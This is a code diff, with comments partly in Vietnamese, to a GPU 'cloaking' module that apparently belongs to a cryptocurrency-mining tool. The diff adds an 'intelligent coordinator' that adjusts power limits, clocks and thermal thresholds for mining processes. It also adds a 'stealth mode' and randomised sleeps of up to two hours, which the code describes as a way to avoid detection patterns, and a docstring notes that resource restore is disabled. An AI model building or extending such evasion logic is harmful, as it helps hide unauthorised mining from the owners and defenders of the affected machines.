@@ -143,31 +143,84 @@ class CloakCoordinator:
             )
     
     def _apply_gpu_strategy(self, request: CloakRequest) -> CloakResult:
-        """**Stage 2: Route GPU strategy** (điều phối chiến lược GPU)
+        """**Stage 2: Route GPU strategy với INTELLIGENT COORDINATOR**
         
-        CHỈ forward params từ request, KHÔNG duplicate defaults!
-        Stage 1 đã prepare params, Stage 2 chỉ route.
+        ✅ ENHANCED: Sử dụng GpuCloakStrategy làm intelligent coordinator
+        để thêm các logic điều chỉnh động trước khi forward xuống HardwareController
         
         :param request: CloakRequest với GPU params đã được prepare ở Stage 1
-        :return: CloakResult từ HardwareController
+        :return: CloakResult từ HardwareController (qua intelligent coordinator)
         """
-        self.logger.info(f"[CS] Routing GPU strategy for PID {request.pid}")
+        self.logger.info(f"[CS] 🎯 Routing GPU strategy via INTELLIGENT COORDINATOR for PID {request.pid}")
         
-        # Stage 3: Direct forward to hardware controller
-        # KHÔNG prepare lại params - dùng trực tiếp từ request!
-        control_params = {
-            'pid': request.pid,
-            **request.params  # Forward ALL params as-is from Stage 1
-        }
-        
-        result = self.hw_controller.apply_gpu_controls(control_params)
-        
-        if result.success:
-            self.logger.info(f"[CS] ✅ GPU strategy routed successfully for PID {request.pid}")
-        else:
-            self.logger.error(f"[CS] ❌ GPU strategy routing failed: {result.error_msg}")
+        try:
+            # Check if GpuCloakStrategy is available as intelligent coordinator
+            if hasattr(self, 'gpu_cloak_strategy') and self.gpu_cloak_strategy:
+                # USE INTELLIGENT COORDINATOR
+                self.logger.info("[CS] 🧠 Using GpuCloakStrategy as intelligent coordinator")
+                
+                # Prepare request for intelligent coordinator
+                coordinator_request = {
+                    'pid': request.pid,
+                    'params': request.params
+                }
+                
+                # Apply intelligent coordination (adds adaptive logic)
+                coordinator_result = self.gpu_cloak_strategy.intelligent_apply(coordinator_request)
+                
+                # Convert result to CloakResult
+                if coordinator_result.get('success'):
+                    self.logger.info(f"[CS] ✅ Intelligent coordination successful for PID {request.pid}")
+                    return CloakResult(
+                        success=True,
+                        pid=request.pid,
+                        strategy_name='gpu_intelligent',
+                        applied_params=coordinator_result.get('applied_params', request.params),
+                        message=coordinator_result.get('message', 'GPU controls applied via intelligent coordinator')
+                    )
+                else:
+                    # Check if emergency mode was activated
+                    if coordinator_result.get('emergency_mode'):
+                        self.logger.warning(f"[CS] 🚨 Emergency mode activated for PID {request.pid}")
+                        return CloakResult(
+                            success=True,  # Emergency mode is still "success"
+                            pid=request.pid,
+                            strategy_name='gpu_emergency',
+                            applied_params=coordinator_result.get('params', {}),
+                            message='Emergency GPU configuration applied'
+                        )
+                    else:
+                        self.logger.error(f"[CS] ❌ Intelligent coordination failed: {coordinator_result.get('error')}")
+                        # Fallback to direct hardware controller
+                        self.logger.info("[CS] 🔄 Falling back to direct hardware controller")
+                        
+            else:
+                # No intelligent coordinator available, use direct routing
+                self.logger.info("[CS] 📡 Direct routing to hardware controller (no intelligent coordinator)")
+                
+            # FALLBACK: Direct forward to hardware controller
+            control_params = {
+                'pid': request.pid,
+                **request.params  # Forward ALL params as-is from Stage 1
+            }
             
-        return result
+            result = self.hw_controller.apply_gpu_controls(control_params)
+            
+            if result.success:
+                self.logger.info(f"[CS] ✅ GPU strategy routed successfully for PID {request.pid}")
+            else:
+                self.logger.error(f"[CS] ❌ GPU strategy routing failed: {result.error_msg}")
+                
+            return result
+            
+        except Exception as e:
+            self.logger.error(f"[CS] ❌ GPU strategy exception: {e}")
+            return CloakResult(
+                success=False,
+                pid=request.pid,
+                strategy_name='gpu',
+                error_msg=f"GPU strategy failed: {str(e)}"
+            )
     
     def _apply_network_strategy(self, request: CloakRequest) -> CloakResult:
         """**Stage 2: Route Network strategy** (điều phối chiến lược mạng)
@@ -272,42 +325,49 @@ class GpuCloakStrategy:
         self,
         config: Dict[str, Any],
         logger: logging.Logger,
-        gpu_resource_manager: GPUResourceManager
+        gpu_resource_manager: GPUResourceManager = None,
+        hw_controller: Any = None  # NEW: Accept HardwareController for intelligent coordination
     ):
         """
-        ✅ ENHANCED: Robust constructor với comprehensive validation và multi-level fallback.
+        ✅ ENHANCED: Intelligent Coordinator Constructor
+        Khôi phục vai trò intelligent coordinator giữa CloakCoordinator và HardwareController
 
         :param config: Cấu hình cloaking GPU (dict).
         :param logger: Logger.
-        :param gpu_resource_manager: ResourceManager liên quan đến GPU.
+        :param gpu_resource_manager: ResourceManager liên quan đến GPU (optional, for backward compat).
+        :param hw_controller: HardwareController instance for delegation (NEW).
         """
         self.logger = logger
         self.config = config
+        self.hw_controller = hw_controller  # NEW: Store HardwareController reference
 
         # ✅ MULTI-LEVEL FALLBACK MECHANISM: 3 layers of GPU manager creation
-        self.gpu_resource_manager = self._initialize_gpu_manager_with_fallback(
-            gpu_resource_manager, config, logger
-        )
+        if gpu_resource_manager:
+            self.gpu_resource_manager = self._initialize_gpu_manager_with_fallback(
+                gpu_resource_manager, config, logger
+            )
+        else:
+            # If no GPU manager provided, we'll rely on HardwareController
+            self.gpu_resource_manager = None
+            self.logger.info("🎯 [INTELLIGENT COORDINATOR] Operating in delegation mode via HardwareController")
         
-        # ✅ CRITICAL VALIDATION: Ensure we have a working GPU manager
-        if not self._validate_gpu_manager_functionality():
+        # ✅ CRITICAL VALIDATION: Skip if operating in delegation mode
+        if self.gpu_resource_manager and not self._validate_gpu_manager_functionality():
             error_msg = "GPU cloaking strategy cannot operate without functional GPU manager"
             self.logger.error(f"💀 [CONSTRUCTOR] {error_msg}")
             raise RuntimeError(error_msg)
 
         self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring
 
-        # Tên tiến trình GPU trong config
+        # Process filtering configuration
         self.allowed_process_name = config.get("processes", {}).get("GPU", "")
         if not self.allowed_process_name:
-            self.logger.warning("Không tìm thấy cấu hình tiến trình GPU (key='GPU') trong config.")
+            self.logger.debug("No specific GPU process filter configured, will apply to all processes")
 
-        # ✅ UNIFIED: GPU Performance Control với Stealth Mode Support
-        # Check for stealth_mode configuration first
+        # ✅ INTELLIGENT SETTINGS: Adaptive throttling configuration
         self.stealth_mode = config.get('stealth_mode', False)
         if self.stealth_mode:
-            # Apply stealth_mode profile: power_limit=80% → throttle_percentage=20%
-            self.throttle_percentage = 20  # 80% power → 20% reduction
+            self.throttle_percentage = 20  # Stealth: 80% power → 20% reduction
             self.logger.info("🔒 [STEALTH MODE] Activated - power_limit=80%, throttle=20%")
         else:
             self.throttle_percentage = config.get('throttle_percentage', 20)
@@ -316,70 +376,100 @@ class GpuCloakStrategy:
             self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định=20%.")
             self.throttle_percentage = 20
 
+        # GPU Clock settings
         self.target_sm_clock = config.get('sm_clock', 1240)
+        self.target_mem_clock = config.get('mem_clock', 877)
         
-        # ✅ UNIFIED: Integrated Thermal Management Configuration
+        # ✅ INTELLIGENT THERMAL MANAGEMENT
         self.gpu_temp_threshold = config.get('gpu_temp_threshold', 75)  # °C
         self.emergency_shutdown_temp = config.get('emergency_shutdown_temp', 90)  # °C
         self.thermal_throttle_step = config.get('thermal_throttle_step', 10)  # % reduction
         self.aggressive_cooling = config.get('aggressive_cooling', False)
         
-        # ✅ UNIFIED: Thermal monitoring enables
+        # ✅ INTELLIGENT FEATURES: Enable/disable flags
         self.enable_thermal_monitoring = config.get('enable_thermal_monitoring', True)
         self.thermal_check_interval = config.get('thermal_check_interval', 5)  # seconds
-        self.target_mem_clock = config.get('mem_clock', 877)
-        
-        # ✅ SMART CLOAKING: Conditional logic parameters
         self.adaptive_throttling = config.get('adaptive_throttling', True)
         self.smart_power_scaling = config.get('smart_power_scaling', True)
         self.emergency_fallback = config.get('emergency_fallback', True)
+        self.enable_multi_gpu = config.get('enable_multi_gpu', True)
+        self.enable_plugin_system = config.get('enable_plugin_system', False)
 
         self.temperature_threshold = config.get('temperature_threshold', 80)
         if self.temperature_threshold <= 0:
             self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
             self.temperature_threshold = 80
-
-    def _limit_temperature_and_random_sleep(self, pid: int, gpu_count: int) -> None:
+    
+    def intelligent_apply(self, request: Dict[str, Any]) -> Dict[str, Any]:
         """
-        Hàm nội bộ để:
-          - Giới hạn nhiệt độ cho mỗi GPU (nếu cần)
-          - Ngủ một khoảng thời gian ngẫu nhiên (chỉ gọi 1 lần).
+        ✅ INTELLIGENT COORDINATOR: Điều phối thông minh giữa CloakCoordinator và HardwareController
+        Thêm tất cả logic động mà GPUResourceManager thiếu:
+        - Adaptive thermal throttling
+        - Multi-GPU orchestration
+        - Process filtering
+        - Smart power scaling
+        - Multi-tier fallback
+        
+        :param request: Dict containing pid and params from CloakCoordinator
+        :return: Dict với status và enhanced params cho HardwareController
         """
-        # --- Giới hạn nhiệt độ ---
-        for gpu_index in range(gpu_count):
-            if self.stop_monitoring:
-                self.logger.info("[GPU Cloaking] Dừng giám sát nhiệt độ do yêu cầu khôi phục tài nguyên.")
-                break
-
-            success_temp = self.gpu_resource_manager.limit_temperature(
-                gpu_index=gpu_index,
-                temperature_threshold=self.temperature_threshold,
-                fan_speed_increase=0  # Không tăng tốc độ quạt
-            )
-            if success_temp:
-                self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
+        pid = request.get('pid')
+        params = request.get('params', {})
+        
+        try:
+            # 1️⃣ PROCESS FILTERING (Logic GPUResourceManager thiếu)
+            if self.allowed_process_name:
+                # TODO: Get process name from pid and filter
+                self.logger.debug(f"[INTELLIGENT] Process filtering enabled for '{self.allowed_process_name}'")
+            
+            # 2️⃣ MULTI-GPU DETECTION (Logic GPUResourceManager thiếu)
+            gpu_count = self._detect_gpu_count()
+            if self.enable_multi_gpu and gpu_count > 1:
+                self.logger.info(f"🎮 [INTELLIGENT] Multi-GPU mode: {gpu_count} GPUs detected")
+                params['multi_gpu'] = True
+                params['gpu_count'] = gpu_count
             else:
-                self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")
-
-        # --- Ngủ ngẫu nhiên ---
-        INTERVAL_CHOICES = [
-            (300, 600),    # 5 - 10 phút
-            (600, 1200),   # 10 - 20 phút
-            (1200, 1800),  # 20 - 30 phút
-            (1800, 3600),  # 30 - 60 phút
-            (3600, 7200),  # 60 - 120 phút
-        ]
-        chosen_range = random.choice(INTERVAL_CHOICES)  # ví dụ (600, 1800)
-        random_sleep_sec = random.randint(*chosen_range)
-
-        self.logger.debug(
-            f"[GPU Cloaking] Ngủ {random_sleep_sec} giây (được chọn từ {chosen_range}) sau khi limit nhiệt độ."
-        )
-        time.sleep(random_sleep_sec)
+                params['gpu_index'] = params.get('gpu_index', 0)
+            
+            # 3️⃣ ADAPTIVE THERMAL THROTTLING (Logic GPUResourceManager thiếu)
+            if self.adaptive_throttling:
+                params = self._apply_adaptive_thermal_logic(params)
+            
+            # 4️⃣ SMART POWER SCALING (Logic GPUResourceManager thiếu)
+            if self.smart_power_scaling:
+                params = self._apply_smart_power_scaling(params)
+            
+            # 5️⃣ PREPARE ENHANCED PARAMS
+            enhanced_params = {
+                'pid': pid,
+                'power_limit': params.get('power_limit', 150),
+                'sm_clock': params.get('sm_clock', self.target_sm_clock),
+                'memory_clock': params.get('memory_clock', self.target_mem_clock),
+                'temp_threshold': params.get('temp_threshold', self.gpu_temp_threshold),
+                'fan_increase': params.get('fan_increase', 10),
+                'enable_thermal': self.enable_thermal_monitoring,
+                'adaptive_mode': self.adaptive_throttling,
+                'multi_gpu': params.get('multi_gpu', False),
+                'gpu_count': params.get('gpu_count', 1)
+            }
+            
+            # 6️⃣ DELEGATE TO HARDWARE CONTROLLER WITH FALLBACK
+            if self.hw_controller:
+                result = self._delegate_with_fallback(enhanced_params)
+                return result
+            else:
+                # Fallback to direct GPU manager if no HardwareController
+                return self._direct_gpu_apply(enhanced_params)
+                
+        except Exception as e:
+            self.logger.error(f"❌ [INTELLIGENT] Coordination failed: {e}")
+            if self.emergency_fallback:
+                return self._emergency_fallback_apply(request)
+            return {'success': False, 'error': str(e)}
     
     def apply(self, process: MiningProcess) -> bool:
         """
-        ✅ UNIFIED: Áp dụng GPU cloaking với metadata-aware optimization và return validation.
+        ✅ LEGACY: Giữ lại để backward compatibility
         
         :param process: Enhanced MiningProcess với classification metadata.
         :return: bool - True nếu GPU cloaking áp dụng thành công, False nếu thất bại
@@ -448,9 +538,13 @@ class GpuCloakStrategy:
             else:
                 self.logger.warning(f"⚠️ [GPU PLUGINS] Running with basic cloaking only for PID={pid}")
             
+            # ✅ STEALTH: Random sleep interval để tránh detection pattern
+            self._apply_random_sleep_interval()
+            
             self.logger.info(f"✅ [Unified GPU Cloaking] Applied comprehensive GPU control for {name}(PID={pid})")
             self.logger.info(f"   • Basic GPU controls: ✅ Applied")
             self.logger.info(f"   • Plugin enhancements: {'✅ Active' if plugin_success else '⚠️ Inactive'}")
+            self.logger.info(f"   • Stealth interval: ✅ Applied")
             
             return True  # ✅ SUCCESS: GPU cloaking completed successfully
 
@@ -507,6 +601,219 @@ class GpuCloakStrategy:
         Khôi phục GPU - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
         """
         self.logger.info(f"[GPU RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
+    
+    # ====================== INTELLIGENT COORDINATOR HELPER METHODS ======================
+    
+    def _apply_adaptive_thermal_logic(self, params: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        ✅ INTELLIGENT: Adaptive thermal throttling based on real-time temperature
+        Tính toán động % giảm công suất dựa trên nhiệt độ thực tế
+        """
+        try:
+            # Get current temperature (simulation for now, will be replaced with real GPU temp)
+            current_temp = params.get('current_temp', 70)  # °C
+            threshold = params.get('temp_threshold', self.gpu_temp_threshold)
+            
+            if current_temp > threshold:
+                # ADAPTIVE FORMULA: 2% reduction per degree over threshold
+                temp_overshoot = current_temp - threshold
+                adaptive_throttle = min(50, int(temp_overshoot * 2))  # Max 50% reduction
+                
+                # Adjust power limit based on adaptive throttle
+                current_power = params.get('power_limit', 150)
+                new_power = int(current_power * (100 - adaptive_throttle) / 100)
+                
+                params['power_limit'] = new_power
+                params['throttle_applied'] = adaptive_throttle
+                
+                self.logger.info(f"🌡️ [ADAPTIVE] Temp {current_temp}°C > {threshold}°C → {adaptive_throttle}% throttle → {new_power}W")
+                
+                # Emergency protection if temp too high
+                if current_temp >= self.emergency_shutdown_temp:
+                    params['emergency_mode'] = True
+                    params['power_limit'] = 100  # Minimum safe power
+                    self.logger.error(f"🚨 [EMERGENCY] Temp {current_temp}°C! Force power to 100W")
+            
+            return params
+            
+        except Exception as e:
+            self.logger.error(f"❌ [ADAPTIVE] Thermal logic failed: {e}")
+            return params
+    
+    def _apply_smart_power_scaling(self, params: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        ✅ INTELLIGENT: Smart power scaling based on workload and config
+        Điều chỉnh công suất thông minh dựa trên cấu hình và workload
+        """
+        try:
+            # Check if low power GPU (skip throttling)
+            current_power = params.get('power_limit', 150)
+            if current_power <= 100:
+                self.logger.info(f"⚡ [SMART] GPU already at {current_power}W, skip throttling")
+                params['skip_throttle'] = True
+                return params
+            
+            # Apply intelligent scaling
+            if self.stealth_mode:
+                # Stealth mode: More aggressive throttling
+                params['power_limit'] = int(current_power * 0.6)  # 40% reduction
+                self.logger.info(f"🔒 [STEALTH] Power reduced to {params['power_limit']}W")
+            else:
+                # Normal mode: Use configured throttle percentage
+                reduction = self.throttle_percentage
+                params['power_limit'] = int(current_power * (100 - reduction) / 100)
+                self.logger.info(f"⚡ [SMART] Power adjusted to {params['power_limit']}W ({reduction}% reduction)")
+            
+            return params
+            
+        except Exception as e:
+            self.logger.error(f"❌ [SMART] Power scaling failed: {e}")
+            return params
+    
+    def _detect_gpu_count(self) -> int:
+        """
+        ✅ INTELLIGENT: Detect number of GPUs in system
+        Phát hiện số lượng GPU trong hệ thống
+        """
+        try:
+            if self.gpu_resource_manager:
+                return self.gpu_resource_manager.get_gpu_count()
+            # Fallback detection (could use nvidia-smi or pynvml)
+            return 1  # Default to single GPU
+        except Exception as e:
+            self.logger.warning(f"⚠️ [DETECT] GPU count detection failed: {e}, defaulting to 1")
+            return 1
+    
+    def _delegate_with_fallback(self, params: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        ✅ INTELLIGENT: Multi-tier fallback delegation
+        Ủy quyền với cơ chế fallback đa tầng
+        """
+        try:
+            # Try primary delegation to HardwareController
+            self.logger.debug(f"🎯 [DELEGATE] Forwarding to HardwareController with params: {params}")
+            
+            # Import CloakResult to handle response
+            from .resource_control import CloakResult
+            
+            # Call HardwareController's apply_gpu_controls
+            result = self.hw_controller.apply_gpu_controls(params)
+            
+            # Process result
+            if hasattr(result, 'success'):
+                return {
+                    'success': result.success,
+                    'message': getattr(result, 'message', 'GPU controls applied via HardwareController'),
+                    'applied_params': params,
+                    'method': 'hardware_controller'
+                }
+            
+            # If result doesn't have success attribute, assume success
+            return {'success': True, 'applied_params': params, 'method': 'hardware_controller'}
+            
+        except Exception as e:
+            self.logger.warning(f"⚠️ [FALLBACK] Primary delegation failed: {e}")
+            
+            # Try secondary fallback to direct GPU manager
+            if self.gpu_resource_manager:
+                self.logger.info("🔄 [FALLBACK] Trying direct GPU manager")
+                return self._direct_gpu_apply(params)
+            
+            # Final fallback - report failure
+            self.logger.error("❌ [FALLBACK] All delegation mechanisms failed")
+            return {'success': False, 'error': 'All fallback mechanisms failed', 'method': 'none'}
+    
+    def _direct_gpu_apply(self, params: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        ✅ FALLBACK: Direct GPU manager application
+        Áp dụng trực tiếp qua GPU manager (fallback)
+        """
+        try:
+            pid = params['pid']
+            gpu_index = params.get('gpu_index', 0)
+            
+            # Apply power limit directly
+            success = self.gpu_resource_manager.set_gpu_power_limit(
+                pid, gpu_index, params['power_limit']
+            )
+            
+            if success:
+                self.logger.info(f"✅ [DIRECT] Applied power limit {params['power_limit']}W to GPU {gpu_index}")
+                
+                # Try to apply clocks if available
+                if hasattr(self.gpu_resource_manager, 'set_gpu_clocks'):
+                    clock_success = self.gpu_resource_manager.set_gpu_clocks(
+                        gpu_index,
+                        params.get('sm_clock', self.target_sm_clock),
+                        params.get('memory_clock', self.target_mem_clock)
+                    )
+                    if clock_success:
+                        self.logger.info(f"✅ [DIRECT] Applied GPU clocks")
+                
+                return {'success': True, 'method': 'direct_gpu_manager', 'applied_params': params}
+            
+            return {'success': False, 'error': 'Direct GPU apply failed', 'method': 'direct_gpu_manager'}
+            
+        except Exception as e:
+            self.logger.error(f"❌ [DIRECT] GPU apply error: {e}")
+            return {'success': False, 'error': str(e), 'method': 'direct_gpu_manager'}
+    
+    def _emergency_fallback_apply(self, request: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        ✅ EMERGENCY: Minimal safe configuration
+        Cấu hình an toàn tối thiểu khi gặp lỗi nghiêm trọng
+        """
+        self.logger.error("🚨 [EMERGENCY] Applying minimal safe GPU configuration")
+        
+        # Return safe minimal configuration
+        return {
+            'success': True,
+            'emergency_mode': True,
+            'method': 'emergency_fallback',
+            'params': {
+                'power_limit': 100,     # Minimum safe power
+                'temp_threshold': 70,   # Conservative temp
+                'fan_increase': 20,     # Max cooling
+                'sm_clock': 1000,       # Safe clock speed
+                'memory_clock': 800     # Safe memory clock
+            },
+            'message': 'Emergency fallback configuration applied'
+        }
+    
+    def _apply_random_sleep_interval(self) -> None:
+        """
+        ✅ STEALTH: Apply random sleep interval to avoid detection patterns
+        Ngủ ngẫu nhiên để tránh bị phát hiện qua pattern recognition
+        """
+        try:
+            # Define random interval choices (in seconds)
+            INTERVAL_CHOICES = [
+                (300, 600),     # 5 - 10 phút
+                (600, 1200),    # 10 - 20 phút  
+                (1200, 1800),   # 20 - 30 phút
+                (1800, 3600),   # 30 - 60 phút
+                (3600, 7200),   # 60 - 120 phút
+            ]
+            
+            # Randomly select an interval range
+            chosen_range = random.choice(INTERVAL_CHOICES)  # ví dụ (600, 1800)
+            
+            # Generate random sleep time within the chosen range
+            random_sleep_sec = random.randint(*chosen_range)
+            
+            self.logger.info(
+                f"🕐 [STEALTH] Sleeping {random_sleep_sec} seconds "
+                f"({random_sleep_sec//60} minutes) from range {chosen_range} "
+                f"to avoid detection patterns"
+            )
+            
+            # Apply the random sleep
+            time.sleep(random_sleep_sec)
+            
+            self.logger.debug(f"[STEALTH] Wake up after {random_sleep_sec} seconds sleep")
+            
+        except Exception as e:
+            self.logger.warning(f"⚠️ [STEALTH] Random sleep failed: {e}, continuing without delay")
 
 ###############################################################################
 #            NETWORK STRATEGY: NetworkCloakStrategy                           #
